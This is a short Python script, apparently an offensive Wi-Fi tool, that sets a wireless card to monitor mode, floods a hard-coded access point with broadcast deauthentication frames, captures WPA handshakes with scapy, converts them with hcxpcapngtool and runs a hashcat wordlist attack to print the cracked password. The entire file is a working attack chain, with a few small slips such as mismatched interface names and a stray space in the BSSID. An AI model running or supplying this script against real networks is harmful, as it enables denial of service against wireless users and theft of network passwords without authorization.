from scapy.all import *
import json
import subprocess
import os
import requests

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# Define the paths
pcap_file = 'captured.pcap'
output_file = 'cracked.hc22000'

# Set Wi-Fi interface to monitor mode
os.system("sudo iwconfig wlan1 mode monitor")

def deauthenticate_network(bssid):
    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / Dot11Deauth()
    sendp(pkt, iface="wlan0", count=5, inter=0.1, verbose=True)

def packet_handler(pkt):
    global handshakes
    # Capture all packets without filtering
    handshakes.append(pkt)  # Store the entire packet
    print("Packet captured:", pkt.summary())

# List to store network data and captured handshakes
networks = []
handshakes = []

# Deauthenticate the network
deauthenticate_network(bssid=" AC:64:62:8E:23:90")

# Sniff Wi-Fi packets
sniff(iface="wlan0", prn=packet_handler, timeout=120)

# Write captured handshakes to a pcap file
wrpcap(pcap_file, handshakes)
print("Captured handshakes saved to", pcap_file)

# Write network data to JSON file
with open("network_data.json", "a") as json_file:
    json.dump(networks, json_file, indent=4)
print("Network data saved to network_data.json")

# Call the function deauthenticate_network
# Define the command
os.system(f'hcxpcapngtool -o {output_file} {pcap_file}')

# Run the hashcat command and capture its output
output = subprocess.run(['hashcat', '-m', '22000', '-a', '0', output_file, 'li.txt'], capture_output=True, text=True)

# Check if hashcat command was successful
if output.returncode == 0:
    # Extract the cracked password from the output
    cracked_password = output.stdout.strip().split(': ')[-1]
    print("Cracked password:", cracked_password)  # Print the cracked password for debugging
